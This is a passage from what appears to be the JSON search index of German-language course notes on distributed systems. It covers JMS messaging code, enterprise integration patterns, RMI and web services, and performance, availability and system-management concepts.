\nsession\n.\ncreateQueue\n(\ntestQueue\n);\n\n\nMessageConsumer\n \nconsumer\n \n=\n \nsession\n.\ncreateConsumer\n(\ndestination\n);\n\n\nTextMessage\n \ntext\n=(\nTextMessage\n)\n \nconsumer\n.\nreceive\n();\n\n\nconsumer\n.\nclose\n();\n \n\nsession\n.\nclose\n();\n\n\nconnection\n.\nclose\n();\n\n\n\n\n\n\nEnterprise Integration Patterns\n\n\nPoint-to-Point Messaging Pattern\n\n\n\n\nSimpelste Form, ein Sender schickt einem Receiver \u00fcber einen beliebigen Channel eine Message\n\n\nMeist wird eine \nMessage Expiration\n gesetzt. Ist diese abgelaufen, wenn der Receiver die Message erh\u00e4lt, wird sie verworfen oder an einen \"Dead Letter Channel\" geschickt\n\n\nCommand Message Pattern\n: Message, die dem Receiver mitteilt, etwas auszuf\u00fchren\n\n\nDocument Message Pattern\n: Reine Daten-\u00dcbertragung\n\n\n\n\nPublic-Subscribe Pattern\n\n\n\n\nDer Publisher (Sender) schickt die Messages an einen \nPublish-Subscribe-Channel\n\n\nDer Channel schickt eine Kopie der Message an einen Output Channel\n\n\nJeder Output-Channel hat genau 1 Subscriber\n\n\n\n\nJeder Subscriber erh\u00e4lt die Nachricht 1 Mal\n\n\n\n\n\n\nTopic-based\n: Subscriber melden sich an verschiedenen \"topics\" an (logische Channels) und erhalten nur die Nachrichten, die zu diesen Topics geschickt werden\n\n\n\n\n\n\nContent-based\n: Der Subscriber definiert Eigenschaften der Messages, die er bekommen m\u00f6chte. Er erh\u00e4lt dann nur die Nachrichten, die dem entspechen\n\n\n\n\n\n\nMeistens gibt es zwischen Publisher und Subscriber einen Message Broker, der die Messages entgegennimmt und Subscribers verwaltet\n\n\n\n\n\n\nReceiving Message Endpoint Pattern\n\n\n\n\nCompeting Customers\n: Mehrere Receiver verarbeiten messages gleichzeitig\n\n\nSelective Customer\n: Der Receiver entscheided beim Ankommen der Message anhand von Kriterien, ob die Message verarbeitet werden soll\n\n\n\n\nRabbitMQ\n\n\n\n\nRouting: Messages werden Anhand von Eigenschaften an den entsprechenden Receiver zugestellt\n\n\nRPC: Beim Request gibt der Client eine Callback Queue an (\nreply_to\n) und eine eindeutige ID. So wird beim Callback die Response dem Request zugeordnet", 
            "title": "4 Asynchronous Messaging"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#asynchronous-messaging", 
            "text": "", 
            "title": "Asynchronous Messaging"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#ziel", 
            "text": "Lose Kopplung zum Austausch von Nachrichten auf unterschiedlichen Plattformen in unterschiedlichen Formaten  Skalierbarkeit, Fehlertoleranz, Erweiterbarkeit  Viele Design-Entscheidungen, z.B. QoS Eigenschaften", 
            "title": "Ziel"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#einfuhrung-messaging", 
            "text": "Eine Message besteht aus Message Descriptor und Message Data  Der Queue Manager ist verantwortlich f\u00fcr das Versenden und Empfangen von Nachrichten  Bei Asynchronous RPC antwortet der Server zwei Mal  Das erste Mal als Best\u00e4tigung der Ausf\u00fchrung (Accept Request)  Das zweite Mal mit dem Resultat", 
            "title": "Einf\u00fchrung Messaging"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#messaging-middleware", 
            "text": "z.B. IBM MQ, Microsoft MQ, ActiveMQ (Apache)", 
            "title": "Messaging Middleware"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#java-message-service-jms-api", 
            "text": "Grundlegende MOM API  Put : Append a message to the queue  Get : Block until queue ist not empty, then remove first message  Poll : Remove first entry if queue is not empty, never block  Notify : Install a handler to be notified when a message is put into the queue    Message Reliability Levels  Eine JMS Message besteht aus Header, Properties und Body  Properties sind Erweiterungen des Standard-headers und optional", 
            "title": "Java Message Service (JMS) API"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#beispiel-queue-sender-message-producer", 
            "text": "Connection   connection   =   connectionFactory . createConnection ();  connection . start ();  Session   session   =   connection . createSession ( mp . transacted , \n     Session . AUTO_ACKNOWLEDGE );  Destination   destination   =   session . createQueue ( testQueue );  MessageProducer   producer   =   session . createProducer ( destination );  producer . setDeliveryMode ( DeliveryMode . PERSISTENT );  TextMessage   message   =   session . createTextMessage ( hello );  producer . send ( message );  producer . close ();  session . close ();  connection . close ();", 
            "title": "Beispiel Queue Sender (Message Producer)"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#beispiel-queue-receiver-message-consumer", 
            "text": "Connection   connection   =   connectionFactory . createConnection ();  connection . start ();  Session   session   =   connection . createSession ( mc . transacted , \n     Session . AUTO_ACKNOWLEDGE );  Destination   destination   =   session . createQueue ( testQueue );  MessageConsumer   consumer   =   session . createConsumer ( destination );  TextMessage   text =( TextMessage )   consumer . receive ();  consumer . close ();   session . close ();  connection . close ();", 
            "title": "Beispiel Queue Receiver (Message Consumer)"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#enterprise-integration-patterns", 
            "text": "", 
            "title": "Enterprise Integration Patterns"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#point-to-point-messaging-pattern", 
            "text": "Simpelste Form, ein Sender schickt einem Receiver \u00fcber einen beliebigen Channel eine Message  Meist wird eine  Message Expiration  gesetzt. Ist diese abgelaufen, wenn der Receiver die Message erh\u00e4lt, wird sie verworfen oder an einen \"Dead Letter Channel\" geschickt  Command Message Pattern : Message, die dem Receiver mitteilt, etwas auszuf\u00fchren  Document Message Pattern : Reine Daten-\u00dcbertragung", 
            "title": "Point-to-Point Messaging Pattern"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#public-subscribe-pattern", 
            "text": "Der Publisher (Sender) schickt die Messages an einen  Publish-Subscribe-Channel  Der Channel schickt eine Kopie der Message an einen Output Channel  Jeder Output-Channel hat genau 1 Subscriber   Jeder Subscriber erh\u00e4lt die Nachricht 1 Mal    Topic-based : Subscriber melden sich an verschiedenen \"topics\" an (logische Channels) und erhalten nur die Nachrichten, die zu diesen Topics geschickt werden    Content-based : Der Subscriber definiert Eigenschaften der Messages, die er bekommen m\u00f6chte. Er erh\u00e4lt dann nur die Nachrichten, die dem entspechen    Meistens gibt es zwischen Publisher und Subscriber einen Message Broker, der die Messages entgegennimmt und Subscribers verwaltet", 
            "title": "Public-Subscribe Pattern"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#receiving-message-endpoint-pattern", 
            "text": "Competing Customers : Mehrere Receiver verarbeiten messages gleichzeitig  Selective Customer : Der Receiver entscheided beim Ankommen der Message anhand von Kriterien, ob die Message verarbeitet werden soll", 
            "title": "Receiving Message Endpoint Pattern"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/#rabbitmq", 
            "text": "Routing: Messages werden Anhand von Eigenschaften an den entsprechenden Receiver zugestellt  RPC: Beim Request gibt der Client eine Callback Queue an ( reply_to ) und eine eindeutige ID. So wird beim Callback die Response dem Request zugeordnet", 
            "title": "RabbitMQ"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/", 
            "text": "RMI \n Web Services\n\n\nRPC\n\n\n\n\nAnalog zu einem Function Call\n\n\nTransparent, ob Function lokal oder remote ist\n\n\nNormalerweise ein synchroner Aufruf\n\n\nMit modernen Frameworwks auch asynchron\n\n\n\n\n\n\nProcedure Calls werden gegen einen lokalen Stub aufgerufen, der dann den Aufruf in eine Message verpackt (\"marshalling\")\n\n\nAuf dem Emfp\u00e4nger empf\u00e4ngt der Server Stub (Skeleton) die Message und called die server procedure\n\n\n\n\nHerausforderungen\n\n\n\n\nblocking calls\n\n\nFehlgeschlagene Aufrufe wegen Netzwerk-Ausfall\n\n\nDer Client muss dies behandeln\n\n\n\n\n\n\nSchwierig f\u00fcr nicht-idempotente Funktionen\n\n\n\n\nRMI\n\n\n\n\nJave Implementation von RPC\n\n\nL\u00e4sst Objekte mit beliebig komplexen Typen \u00fcbertragen\n\n\nRemote Objects werden vom Server in einer Registry eingetragen, damit sie aufgerufen werden k\u00f6nnen\n\n\nEs k\u00f6nnen auch Klassen-Definitionen in beide Richtungen \u00fcbertragen werden\n\n\nSo kann der Client unabh\u00e4ngig von der Implementation der Business Logik sein\n\n\n\n\n\n\nObjects werden \u00fcber HTTP \u00fcbertragen\n\n\n\n\nRemote Object\n\n\n\n\nObjects werden Remote, wenn sie ein Interface implementieren, das von \njava.rmi.Remote\n ableitet\n\n\n\n\nProbleme\n\n\n\n\nEnge Kopplung Client-Server wegen Serialisierung\n\n\nGleiche JVM-Version auf Client und Server\n\n\nIst inher\u00e4nt synchron, w\u00e4hrend message-based Protokolle inher\u00e4nt asynchron sind\n\n\n\n\nInterface Description Language\n\n\n\n\nSprache, um Interfaces sprachunabh\u00e4ngig zu definieren\n\n\n\n\nWeb Services\n\n\nWSDL\n\n\n\n\nWeb Service Description Language\n\n\nBeschreibt das Interface des Servers und dessen Datenstrukturen\n\n\nWird z.B. in WCF verwendet", 
            "title": "5 RMI Web Services"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#rmi-web-services", 
            "text": "", 
            "title": "RMI &amp; Web Services"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#rpc", 
            "text": "Analog zu einem Function Call  Transparent, ob Function lokal oder remote ist  Normalerweise ein synchroner Aufruf  Mit modernen Frameworwks auch asynchron    Procedure Calls werden gegen einen lokalen Stub aufgerufen, der dann den Aufruf in eine Message verpackt (\"marshalling\")  Auf dem Emfp\u00e4nger empf\u00e4ngt der Server Stub (Skeleton) die Message und called die server procedure", 
            "title": "RPC"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#herausforderungen", 
            "text": "blocking calls  Fehlgeschlagene Aufrufe wegen Netzwerk-Ausfall  Der Client muss dies behandeln    Schwierig f\u00fcr nicht-idempotente Funktionen", 
            "title": "Herausforderungen"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#rmi", 
            "text": "Jave Implementation von RPC  L\u00e4sst Objekte mit beliebig komplexen Typen \u00fcbertragen  Remote Objects werden vom Server in einer Registry eingetragen, damit sie aufgerufen werden k\u00f6nnen  Es k\u00f6nnen auch Klassen-Definitionen in beide Richtungen \u00fcbertragen werden  So kann der Client unabh\u00e4ngig von der Implementation der Business Logik sein    Objects werden \u00fcber HTTP \u00fcbertragen", 
            "title": "RMI"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#remote-object", 
            "text": "Objects werden Remote, wenn sie ein Interface implementieren, das von  java.rmi.Remote  ableitet", 
            "title": "Remote Object"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#probleme", 
            "text": "Enge Kopplung Client-Server wegen Serialisierung  Gleiche JVM-Version auf Client und Server  Ist inher\u00e4nt synchron, w\u00e4hrend message-based Protokolle inher\u00e4nt asynchron sind", 
            "title": "Probleme"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#interface-description-language", 
            "text": "Sprache, um Interfaces sprachunabh\u00e4ngig zu definieren", 
            "title": "Interface Description Language"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#web-services", 
            "text": "", 
            "title": "Web Services"
        }, 
        {
            "location": "/Vss/5_RMI_Web-Services/#wsdl", 
            "text": "Web Service Description Language  Beschreibt das Interface des Servers und dessen Datenstrukturen  Wird z.B. in WCF verwendet", 
            "title": "WSDL"
        }, 
        {
            "location": "/Vss/6_Design_for_Performance/", 
            "text": "Operationale Modelle, Design for Performance\n\n\nNon-Functional Requiremenets\n\n\n\n\nConstraints\n: Limitationen, \u00e4ussere Einfl\u00fcsse und das Umfeld des Kunden, z.B. auch Standards und Regulierungen\n\n\n\n\nQualities\n: \"Service Level Requirements\", sind messbar, z.B. Performance, Security, Portability, Reliability, etc. etc.\n\n\n\n\n\n\nWie\n bringt ein System seine Funktionalit\u00e4t? (Nicht \"was macht es\")\n\n\n\n\nQOS ist eine Abw\u00e4gung zwischen Risiko und Kosten\n\n\nWerden Anforderungen nicht erf\u00fcllt, gibt es Business Risiken\n\n\nWird over-engineered, gibt es unn\u00f6tige Kosten\n\n\n\n\n\n\n\n\nPerformance\n\n\n\n\n\"The degree to which a system or component accomplishes its designated functions within given constraints, such as speed, accuracy, or memory usage.\"\n\n\n\n\n\n\nHauptziele von Performance sind schnelle Antwortzeiten und \nPredictability\n\n\n\n\nNicht immer ist schneller besser, manche Systeme brauchen auch eine sehr konsistente Performance (z.B. real-time)\n\n\n\n\n\n\nF\u00fcr schnelle Antwortzeiten braucht es gen\u00fcged Durchsatz (z.B. Transaktionen pro Sekunde)\n\n\n\n\nF\u00fcr gen\u00fcgend Durchsatz braucht es gen\u00fcged Kapazit\u00e4t (Scalability)\n\n\n\n\nFunctional / Operational Model\n\n\n\n\nFunctional Model: Die funktionalen Komponenten eines Systems\n\n\nOperational Model: Das System, auf das die Komponenten deployed werden (Infrastruktur)", 
            "title": "6 Design for Performance"
        }, 
        {
            "location": "/Vss/6_Design_for_Performance/#operationale-modelle-design-for-performance", 
            "text": "", 
            "title": "Operationale Modelle, Design for Performance"
        }, 
        {
            "location": "/Vss/6_Design_for_Performance/#non-functional-requiremenets", 
            "text": "Constraints : Limitationen, \u00e4ussere Einfl\u00fcsse und das Umfeld des Kunden, z.B. auch Standards und Regulierungen   Qualities : \"Service Level Requirements\", sind messbar, z.B. Performance, Security, Portability, Reliability, etc. etc.    Wie  bringt ein System seine Funktionalit\u00e4t? (Nicht \"was macht es\")   QOS ist eine Abw\u00e4gung zwischen Risiko und Kosten  Werden Anforderungen nicht erf\u00fcllt, gibt es Business Risiken  Wird over-engineered, gibt es unn\u00f6tige Kosten", 
            "title": "Non-Functional Requiremenets"
        }, 
        {
            "location": "/Vss/6_Design_for_Performance/#performance", 
            "text": "\"The degree to which a system or component accomplishes its designated functions within given constraints, such as speed, accuracy, or memory usage.\"    Hauptziele von Performance sind schnelle Antwortzeiten und  Predictability   Nicht immer ist schneller besser, manche Systeme brauchen auch eine sehr konsistente Performance (z.B. real-time)    F\u00fcr schnelle Antwortzeiten braucht es gen\u00fcged Durchsatz (z.B. Transaktionen pro Sekunde)   F\u00fcr gen\u00fcgend Durchsatz braucht es gen\u00fcged Kapazit\u00e4t (Scalability)", 
            "title": "Performance"
        }, 
        {
            "location": "/Vss/6_Design_for_Performance/#functional-operational-model", 
            "text": "Functional Model: Die funktionalen Komponenten eines Systems  Operational Model: Das System, auf das die Komponenten deployed werden (Infrastruktur)", 
            "title": "Functional / Operational Model"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/", 
            "text": "Design for Scalability \n Availability\n\n\nScalability\n\n\n\n\nZiel: Skalierung soll linear sein\n\n\nWorkload ist linear proportional zu den vorhandenen Ressourcen\n\n\n\n\n\n\nIn Gr\u00f6sse Skalieren: Schnellere oder mehr Hardware-Komponenten\n\n\nGeneration Scalability: Schnellere / Bessere HW-Komponenten durch technische Innovation\n\n\nVertikal\n skalieren: Performance / Kapazit\u00e4t der Server erh\u00f6hen\n\n\nHorizontal\n skalieren (Scale out): Anzahl Server / Nodes erh\u00f6hen\n\n\nz.B. mit Load-Balancer verteilen\n\n\nSession Affinity\n: Alle requests einer Session werden vom Load-Balancer an den gleichen App-Server geschickt\n\n\nWird mit Session-Cookie realisiert\n\n\n\n\n\n\n\n\n\n\n\n\nAvailability\n\n\nUrsachen von Fehlern\n\n\n\n\nArchitektur / Umwelt\n\n\nKommunikationskan\u00e4le\n\n\nStrom\n\n\nH\u00f6here Gewalt\n\n\n\n\n\n\nSystem-Management\n\n\nAuch die besten Mitarbeiter machen Fehler\n\n\nM\u00f6glichst automatisieren\n\n\nRedundanz\n\n\nSchulung\n\n\n\n\n\n\nSoftware-Installation\n\n\n\n\n\n\n\"Transient Software Errors\"\n\n\nFehler, die nicht immer reproduzierbar sind\n\n\nAnderes Verhalten beim Debuggen\n\n\nRace Conditions\n\n\n\n\n\n\n\n\nDefinition\n\n\n\n\nEin System ist \"available\", wenn es l\u00e4uft \nund\n korrekte Resultate erzeugt, und evtl. weitere NFS wie Response Time erf\u00fcllt\n\n\nAvailability ist der Anteil der Zeit, in der das System verf\u00fcgbar ist (0 - 1)\n\n\n\n\nBegriffe\n\n\n\n\nMean Time to Recover (MTTR)\n: Durschnittliche Zeit zwischen dem Ausfall und der Wiederaufnahme\n\n\nMean Time to Failure (MTTF)\n: Durchschnittliche Zeit zwischen zwei Ausf\u00e4llen\n\n\n\n\nMean Time between Failure (MTBF)\n: Durchschnittliche Zeit zwischen zweil Ausf\u00e4llen, \nrecovery time eingerechnet\n. (MTTF + MTTR)\n\n\n\n\n\n\nRecovery Time Objective (RTO)\n: Zeit, in der das System wiederhergestellt werden \nmuss\n (NFR-Requirement)\n\n\n\n\nRecovery Point Objective (RPO)\n: Maximal tolerierbare Zeitspanne, in der Daten nach einem Ausfall verloren sein k\u00f6nnten (NFR-Requirement)\n\n\n\n\nKosten\n\n\n\n\nKosten wachsen nach 95% 1Availability sehr schnell, 100% ist fast unm\u00f6glich\n\n\nGesucht wird das Minimum der Funktionen Cost of Downtime + Costs of Availability\n\n\n\n\n\n\n\n\nWenn Komponenten voneinander abh\u00e4ngen, wird die Verf\u00fcgbarkeit der einzelnen multipliziert -\n Die totale Verf\u00fcgbarkeit ist kleiner als die der schw\u00e4chsten Komponente\n\n\nBei Parallelen Komponenten ist die totale Verf\u00fcgbarkeit \n 1 - [ (1 - A1) * (1 - A2) * (1 - A3) ]\n\n\n\n\nDie gesamte Verf\u00fcgbarkeit ist h\u00f6her als die der einzelnen Komponenten\n\n\n\n\n\n\n\n\nTechniken zur Verbesserung der Verf\u00fcgbarkeit\n\n\nSingle Point of Failures vermeiden\n\n\n\n\nSind oft selten gebrauchte Komponenten\n\n\nLogin-Server (z.B. Active Directory)\n\n\nKann auf Hardware- oder Software-Seite sein\n\n\n\n\nRedundanz\n\n\n\n\nClusters\n\n\nWarm Backups\n\n\nZwei Server laufen parallel mit einem als Master und der andere passiv\n\n\nBei einem Ausfall \u00fcbernimmt der zweite, passive, Server (Fail-over)\n\n\n\n\n\n\nHot Backup\n\n\nMaster- und Backup-Server arbeiten parallel, Backup muss immer den gleichen Stand haben wie Master (synchronisiert)\n\n\nIst teuer, da praktisch die doppelte Anzahl Resourcen gebraucht werden\n\n\nWird z.B. im Aktiengesch\u00e4ft eingesetzt\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDesign Option\n\n\nInstalled Nodes\n\n\nRunning Nodes\n\n\nActive Nodes\n\n\n\n\n\n\n\n\n\n\nCold Standby\n\n\nN\n\n\n1\n\n\n1\n\n\n\n\n\n\nWarm Standby\n\n\nN\n\n\nN\n\n\n1\n\n\n\n\n\n\nHot Standby\n\n\nN\n\n\nN\n\n\nN\n\n\n\n\n\n\n\n\nAusf\u00e4lle so schnell wie m\u00f6glich entdecken\n\n\n\n\nJe kleiner das Auftreten des Fehlers zum Erkennen ist, desto kleiner wird die MTTR\n\n\nFail fast\n\n\nFehler sofort melden, wenn es zu Ausfall kommen k\u00f6nnte\n\n\nSystem regelm\u00e4ssig pr\u00fcfen, um Fehler fr\u00fch zu erkennen", 
            "title": "7 Scalability Availability"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#design-for-scalability-availability", 
            "text": "", 
            "title": "Design for Scalability &amp; Availability"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#scalability", 
            "text": "Ziel: Skalierung soll linear sein  Workload ist linear proportional zu den vorhandenen Ressourcen    In Gr\u00f6sse Skalieren: Schnellere oder mehr Hardware-Komponenten  Generation Scalability: Schnellere / Bessere HW-Komponenten durch technische Innovation  Vertikal  skalieren: Performance / Kapazit\u00e4t der Server erh\u00f6hen  Horizontal  skalieren (Scale out): Anzahl Server / Nodes erh\u00f6hen  z.B. mit Load-Balancer verteilen  Session Affinity : Alle requests einer Session werden vom Load-Balancer an den gleichen App-Server geschickt  Wird mit Session-Cookie realisiert", 
            "title": "Scalability"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#availability", 
            "text": "", 
            "title": "Availability"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#ursachen-von-fehlern", 
            "text": "Architektur / Umwelt  Kommunikationskan\u00e4le  Strom  H\u00f6here Gewalt    System-Management  Auch die besten Mitarbeiter machen Fehler  M\u00f6glichst automatisieren  Redundanz  Schulung    Software-Installation    \"Transient Software Errors\"  Fehler, die nicht immer reproduzierbar sind  Anderes Verhalten beim Debuggen  Race Conditions", 
            "title": "Ursachen von Fehlern"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#definition", 
            "text": "Ein System ist \"available\", wenn es l\u00e4uft  und  korrekte Resultate erzeugt, und evtl. weitere NFS wie Response Time erf\u00fcllt  Availability ist der Anteil der Zeit, in der das System verf\u00fcgbar ist (0 - 1)", 
            "title": "Definition"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#begriffe", 
            "text": "Mean Time to Recover (MTTR) : Durschnittliche Zeit zwischen dem Ausfall und der Wiederaufnahme  Mean Time to Failure (MTTF) : Durchschnittliche Zeit zwischen zwei Ausf\u00e4llen   Mean Time between Failure (MTBF) : Durchschnittliche Zeit zwischen zweil Ausf\u00e4llen,  recovery time eingerechnet . (MTTF + MTTR)    Recovery Time Objective (RTO) : Zeit, in der das System wiederhergestellt werden  muss  (NFR-Requirement)   Recovery Point Objective (RPO) : Maximal tolerierbare Zeitspanne, in der Daten nach einem Ausfall verloren sein k\u00f6nnten (NFR-Requirement)", 
            "title": "Begriffe"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#kosten", 
            "text": "Kosten wachsen nach 95% 1Availability sehr schnell, 100% ist fast unm\u00f6glich  Gesucht wird das Minimum der Funktionen Cost of Downtime + Costs of Availability     Wenn Komponenten voneinander abh\u00e4ngen, wird die Verf\u00fcgbarkeit der einzelnen multipliziert -  Die totale Verf\u00fcgbarkeit ist kleiner als die der schw\u00e4chsten Komponente  Bei Parallelen Komponenten ist die totale Verf\u00fcgbarkeit   1 - [ (1 - A1) * (1 - A2) * (1 - A3) ]   Die gesamte Verf\u00fcgbarkeit ist h\u00f6her als die der einzelnen Komponenten", 
            "title": "Kosten"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#techniken-zur-verbesserung-der-verfugbarkeit", 
            "text": "", 
            "title": "Techniken zur Verbesserung der Verf\u00fcgbarkeit"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#single-point-of-failures-vermeiden", 
            "text": "Sind oft selten gebrauchte Komponenten  Login-Server (z.B. Active Directory)  Kann auf Hardware- oder Software-Seite sein", 
            "title": "Single Point of Failures vermeiden"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#redundanz", 
            "text": "Clusters  Warm Backups  Zwei Server laufen parallel mit einem als Master und der andere passiv  Bei einem Ausfall \u00fcbernimmt der zweite, passive, Server (Fail-over)    Hot Backup  Master- und Backup-Server arbeiten parallel, Backup muss immer den gleichen Stand haben wie Master (synchronisiert)  Ist teuer, da praktisch die doppelte Anzahl Resourcen gebraucht werden  Wird z.B. im Aktiengesch\u00e4ft eingesetzt        Design Option  Installed Nodes  Running Nodes  Active Nodes      Cold Standby  N  1  1    Warm Standby  N  N  1    Hot Standby  N  N  N", 
            "title": "Redundanz"
        }, 
        {
            "location": "/Vss/7_Scalability_Availability/#ausfalle-so-schnell-wie-moglich-entdecken", 
            "text": "Je kleiner das Auftreten des Fehlers zum Erkennen ist, desto kleiner wird die MTTR  Fail fast  Fehler sofort melden, wenn es zu Ausfall kommen k\u00f6nnte  System regelm\u00e4ssig pr\u00fcfen, um Fehler fr\u00fch zu erkennen", 
            "title": "Ausf\u00e4lle so schnell wie m\u00f6glich entdecken"
        }, 
        {
            "location": "/Vss/8_Vss_Management/", 
            "text": "VSS Management\n\n\nSystem Management\n\n\n\n\nZu Systems Management geh\u00f6rt u.a.\n\n\nSoftware distribution\n\n\nversion control\n\n\nBackup / Recovery\n\n\nPerformance Monitoring\n\n\nNetwork Management\n\n\n\n\n\n\nZu \nConfiguration Management\n geh\u00f6rt das Dokumentieren des Systems und Nachverfolgbarkeit, damit fr\u00fchere Versionen maintained werden k\u00f6nnen\n\n\nEin Service Management Framework ist z.B. \nITIL\n\n\n\n\nPatterns f\u00fcr message-basierte Software\n\n\nWiretap\n\n\nEinen Message-Channel \"abh\u00f6ren\", indem die Messages neben dem Ziel auch an einen zweiten Channel zur Inspektion gesendet werden\n\n\nDetour\n\n\nNicht alle Messages werden direkt ans Ziel gesendet, sondern an eine Zwischenstelle, die Validierung, Debugging o.\u00e4. vornimmt. Ein Router entscheidet, welche Messages \u00fcber diese \"Detour\" und welche direkt an das Ziel gesendet werden\n\n\nTest Message\n\n\nEine Art Black-Box-Test, in dem Test Messages ins System gef\u00fcttert werden, und hinterher geschaut, welche Messages raus kommen. So k\u00f6nnen interne Verarbeitungs-Fehler erkannt werden\n\n\nSmart Proxy\n\n\n\n\nIn Systemen, in der Messages vom Absender mit einer Return-Adresse versehen werden\n\n\nAnalog zu einem Web-Proxy: Er \u00e4ndert die Returnadresse zu sich selbst, und leitet die Antwort schliesslich zum originalen Absender wieder\n\n\nProxy hat dann Einsicht in die Messages\n\n\n\n\nMessage Store\n\n\nF\u00fcr jede Message wird jeweils eine Kopie an einen zentralen Message Store gesendet. Dieser speichert dann die gesamte oder Teile der Message\n\n\nMessage History\n\n\nDie Message tr\u00e4gt eine History auf sich (im Header), von welchen Applikationen sie bereits vearbeitet wurde. Dies erleichtert debugging, da man den Weg der Message verfolgen kann.\n\n\nChannel Purger\n\n\nEin Filter, der gewisse \"verbliebene\" Messages verwirft, damit das System wieder in einen konsitenten Zustand versetzt wird.\n\n\nJava Management Extensions (JMX)\n\n\n\n\nJava Technologie, um Applikationen, System-Objekte und Devices zu managen\n\n\nJedes Objekt ist ein \nMBean\n (Managed Bean)\n\n\nDer Standard JMX-Client ist \njconsole\n\n\n\n\nLogging\n\n\nHerausforderungen\n\n\n\n\nEasy to use, wiederverwendbar\n\n\nZentralisiert, damit der Administrator es an einem Ort einsehen kann\n\n\nNur wenig Performance-Einbussen auf die Applikation\n\n\nFilterung nach Konfiguration f\u00fcr verschiedene Typen\n\n\n\n\nTipps\n\n\n\n\nLogging Framework benutzen (z.B. \nlog4j\n)\n\n\nMehrere Log levels (\ndebug\n, \ninfo\n, \nwarning\n, \nsevere\n)\n\n\nslf4j\n als Wrapper benutzen, damit das konkrete Logging-Framework abstrahiert wird und sp\u00e4ter ge\u00e4ndert werden kann\n\n\nIn Logs \"W\"-Fragen beantworten: Wo ist was, wie, wann und von wem passiert? etc.", 
            "title": "8 Vss Management"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#vss-management", 
            "text": "", 
            "title": "VSS Management"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#system-management", 
            "text": "Zu Systems Management geh\u00f6rt u.a.  Software distribution  version control  Backup / Recovery  Performance Monitoring  Network Management    Zu  Configuration Management  geh\u00f6rt das Dokumentieren des Systems und Nachverfolgbarkeit, damit fr\u00fchere Versionen maintained werden k\u00f6nnen  Ein Service Management Framework ist z.B.  ITIL", 
            "title": "System Management"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#patterns-fur-message-basierte-software", 
            "text": "", 
            "title": "Patterns f\u00fcr message-basierte Software"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#wiretap", 
            "text": "Einen Message-Channel \"abh\u00f6ren\", indem die Messages neben dem Ziel auch an einen zweiten Channel zur Inspektion gesendet werden", 
            "title": "Wiretap"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#detour", 
            "text": "Nicht alle Messages werden direkt ans Ziel gesendet, sondern an eine Zwischenstelle, die Validierung, Debugging o.\u00e4. vornimmt. Ein Router entscheidet, welche Messages \u00fcber diese \"Detour\" und welche direkt an das Ziel gesendet werden", 
            "title": "Detour"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#test-message", 
            "text": "Eine Art Black-Box-Test, in dem Test Messages ins System gef\u00fcttert werden, und hinterher geschaut, welche Messages raus kommen. So k\u00f6nnen interne Verarbeitungs-Fehler erkannt werden", 
            "title": "Test Message"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#smart-proxy", 
            "text": "In Systemen, in der Messages vom Absender mit einer Return-Adresse versehen werden  Analog zu einem Web-Proxy: Er \u00e4ndert die Returnadresse zu sich selbst, und leitet die Antwort schliesslich zum originalen Absender wieder  Proxy hat dann Einsicht in die Messages", 
            "title": "Smart Proxy"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#message-store", 
            "text": "F\u00fcr jede Message wird jeweils eine Kopie an einen zentralen Message Store gesendet. Dieser speichert dann die gesamte oder Teile der Message", 
            "title": "Message Store"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#message-history", 
            "text": "Die Message tr\u00e4gt eine History auf sich (im Header), von welchen Applikationen sie bereits vearbeitet wurde. Dies erleichtert debugging, da man den Weg der Message verfolgen kann.", 
            "title": "Message History"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#channel-purger", 
            "text": "Ein Filter, der gewisse \"verbliebene\" Messages verwirft, damit das System wieder in einen konsitenten Zustand versetzt wird.", 
            "title": "Channel Purger"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#java-management-extensions-jmx", 
            "text": "Java Technologie, um Applikationen, System-Objekte und Devices zu managen  Jedes Objekt ist ein  MBean  (Managed Bean)  Der Standard JMX-Client ist  jconsole", 
            "title": "Java Management Extensions (JMX)"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#logging", 
            "text": "", 
            "title": "Logging"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#herausforderungen", 
